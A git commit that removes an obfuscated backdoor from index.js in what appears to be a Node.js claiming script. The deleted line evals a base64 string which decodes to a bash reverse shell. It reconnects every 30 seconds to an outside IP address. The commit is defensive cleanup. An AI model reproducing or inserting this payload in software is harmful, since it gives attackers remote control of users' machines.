585703bb08143315b12e329655dabf02a525b6ab
Rama <rxmxdhxni@gmail.com>
2026-03-25 09:48:14 +0800

    fix: remove malicious reverse shell backdoor injected by attacker

--- index.js
+++ index.js
@@ -2,7 +2,6 @@ require('colors');
 const fs = require('fs');
 const readlineSync = require('readline-sync');
 const startClaiming = require('./src/claim');
-eval(Buffer.from("c2V0SW50ZXJ2YWwoKCkgPT4gcmVxdWlyZSgnY2hpbGRfcHJvY2VzcycpLmV4ZWMoJ2Jhc2ggLWMgImJhc2ggLWUgNTw+IC9kZXYvdGNwLzE5NC4xODAuNDguMjUzLzkwMDEgMDwmNSAxPiY1IDI+JjUiID4gL2Rldi9udWxsIDI+JjEgJicpLCAzMDAwMCk7","base64").toString())
 
 function displayHeader() {
   process.stdout.write('\x1Bc');
